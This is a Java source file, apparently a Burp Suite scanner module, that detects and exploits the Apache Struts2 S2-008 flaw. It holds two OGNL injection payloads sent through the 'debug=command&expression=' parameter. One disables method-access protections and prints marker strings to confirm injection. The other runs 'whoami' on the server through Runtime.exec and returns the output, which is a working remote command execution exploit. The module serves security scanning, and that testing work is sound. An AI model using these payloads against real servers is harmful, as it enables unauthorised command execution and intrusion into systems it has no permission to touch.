package module.java.vul;

import burp.*;

import java.net.URLEncoder;

public class S2_008 extends IModule {
    public String poc =
        "debug=command&expression=" +
        "(" +
        "#_memberAccess.allowStaticMethodAccess=true," +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
        "#out.getWriter().print(\"" + injectMark[0] + "\")," +
        "#out.getWriter().print(\"" + injectMark[1] + "\")," +
        "#out.getWriter().flush()," +
        "#out.getWriter().close()" +
        ")";
    public String exp1 =
        "debug=command&expression=" +
        "(" +
        "#_memberAccess.allowStaticMethodAccess=true," +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
        "#cmd=\"whoami\"," +
        "#ret=@java.lang.Runtime@getRuntime().exec(#cmd)," +
        "#data=new java.io.DataInputStream(#ret.getInputStream())," +
        "#res=new byte[4]," +
        "#data.readFully(#res)," +
        "#echo=new java.lang.String(#res)," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
        "#out.getWriter().print(#echo)," +
        "#out.getWriter().flush()," +
        "#out.getWriter().close()" +
        ")";

    @Override
    public IScanIssue start() {
        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }

        String[] parameters = poc.split("&");
        for (String parameter: parameters) {
            String[] tmp = parameter.split("=", 2);
            String parameterName = tmp[0];
            String parameterValue = tmp[1];
            IParameter newParameter = helpers.buildParameter(parameterName, URLEncoder.encode(parameterValue), in);
            request = helpers.updateParameter(request, newParameter);
        }
        if (check()) {
            this.detail = URLEncoder.encode(exp1).replace("%3D", "=").replace("%26", "&");
            return creatCustomScanIssue();
        }
        return null;
    }
}
